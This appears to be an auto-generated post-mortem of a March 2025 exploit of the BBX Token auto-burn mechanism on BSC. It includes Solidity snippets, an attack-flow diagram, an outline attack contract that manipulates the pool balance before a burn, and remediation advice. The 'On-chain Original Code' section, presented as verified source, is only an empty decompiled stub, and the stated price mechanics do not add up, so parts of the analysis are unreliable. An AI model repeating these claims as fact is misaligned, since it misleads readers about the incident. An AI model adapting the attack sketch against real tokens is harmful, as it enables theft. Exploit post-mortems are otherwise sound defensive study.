# BBX Token — Burn Mechanism Exploitation Analysis

| Field | Details |
|------|------|
| **Date** | 2025-03-20 |
| **Protocol** | BBX Token |
| **Chain** | BSC |
| **Loss** | 11,902 BUSD |
| **Attacker** | [0x8aea7516b3b6aabf474f8872c5e71c1a7907e69e](https://bscscan.com/address/0x8aea7516b3b6aabf474f8872c5e71c1a7907e69e) |
| **Attack Tx** | [0x0dd48636...](https://bscscan.com/tx/0x0dd486368444598610239b934dd9e8c6474a06d11380d1cfec4d91568b5ac581) |
| **Vulnerable Contract** | [0x6051428b580f561b627247119eed4d0483b8d28e](https://bscscan.com/address/0x6051428b580f561b627247119eed4d0483b8d28e) |
| **Root Cause** | Exploitation of timing and burn amount calculation logic vulnerabilities in the auto-burn mechanism |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-03/BBXToken_exp.sol) |

---

## 1. Vulnerability Overview

A vulnerability was discovered in the auto-burn mechanism of BBX Token. The contract automatically burns BBX tokens from the LP pool at fixed time intervals (`lastBurnGapTime`). An attacker manipulated the burn amount calculation by adding large quantities of BBX to the LP pool immediately before a burn event, distorting the computed burn amount. This caused far more tokens to be burned than intended, triggering a sharp price spike that the attacker exploited for profit.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable burn mechanism
function _transfer(address from, address to, uint256 amount) internal override {
    uint256 lastBurn = lastBurnTime();
    uint256 burnGap = lastBurnGapTime();

    if (block.timestamp - lastBurn >= burnGap) {
        address lp = liquidityPool();
        uint256 burnAmount = balanceOf(lp) * burnRate() / 10000;
        // ❌ burnAmount depends on balanceOf(lp), which can be externally manipulated
        _burn(lp, burnAmount);
        IUniswapV2Pair(lp).sync(); // update reserves
    }
    super._transfer(from, to, amount);
}

// ✅ Improved code
function _autoBurn() internal {
    uint256 burnAmount = FIXED_BURN_AMOUNT; // ✅ fixed burn amount, or
    // alternatively use TWAP-based calculation
    require(burnAmount <= MAX_BURN_PER_INTERVAL, "Burn too large"); // ✅ upper bound
    _burn(liquidityPool(), burnAmount);
}
```

### On-chain Original Code

Source: Sourcify verified

```solidity
// File: BBXToken_decompiled.sol
contract BBXToken {
    function burn(address a) external {  // ❌ vulnerability
        // TODO: decompiled logic not implemented
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[1]─► Deploy contract (calculate burn trigger timing)
  │         └─► Analyze lastBurnTime + lastBurnGapTime
  │
  ├─[2]─► Deposit large amount of BBX into BBX/BUSD LP pool just before burn
  │         └─► balanceOf(lp) increases → burn amount amplified
  │
  ├─[3]─► Call transfer() to trigger auto-burn
  │         └─► Excessive BBX burned → price spikes sharply
  │
  ├─[4]─► Sell pre-held BBX at inflated price for BUSD
  │
  └─[5]─► Net profit: ~11,902 BUSD
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract AttackContract {
    function attack() public {
        // [1] Analyze burn timing
        uint256 lastBurn = IBBXToken(BBX).lastBurnTime();
        uint256 burnGap = IBBXToken(BBX).lastBurnGapTime();

        // [2] Wait until just before the burn window (using vm.warp)
        // In the actual attack, timing was captured via mempool monitoring

        // [3] Send large amount of BBX directly to LP pool to amplify burn amount
        IERC20(BBX).transfer(IBBXToken(BBX).liquidityPool(), LARGE_AMOUNT);

        // [4] Trigger burn (call any arbitrary transfer)
        IERC20(BBX).transfer(address(this), 1); // trigger auto-burn

        // [5] Sell held BBX after price spike
        IERC20(BBX).approve(PANCAKE_ROUTER, type(uint256).max);
        // swapExactTokensForTokens(BBX → BUSD)...

        // [6] Transfer BUSD profit
        IERC20(BUSD).transfer(msg.sender, IERC20(BUSD).balanceOf(address(this)));
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|------|
| **Vulnerability Type** | Auto-burn calculation depends on LP contract balance, which is manipulable via direct transfers |
| **Attack Technique** | Burn Mechanism Manipulation |
| **DASP Category** | Bad Arithmetic |
| **CWE** | CWE-682: Incorrect Calculation |
| **Severity** | High |
| **Attack Complexity** | Medium |

## 6. Remediation Recommendations

1. **Fixed Burn Amount**: Use a fixed burn amount instead of a dynamic burn amount derived from `balanceOf(lp)`.
2. **Burn Amount Cap**: Set a maximum burn amount per single burn event.
3. **Pre-burn Snapshot**: Use a balance snapshot from a prior, unmanipulated point in time when calculating the burn amount.
4. **Timelock**: Add a short timelock to the burn mechanism to reduce manipulation opportunities.

## 7. Lessons Learned

- **Risks of Automated Mechanisms**: Automated mechanisms such as auto-burn and auto-fee distribution can be vulnerable to external manipulation.
- **Danger of `balanceOf()` Dependence**: When using `balanceOf()` as a calculation basis, one must recognize that the value can be manipulated via direct transfers.
- **Timing Attacks**: Due to blockchain transparency, attackers can precisely identify and exploit vulnerable timing windows.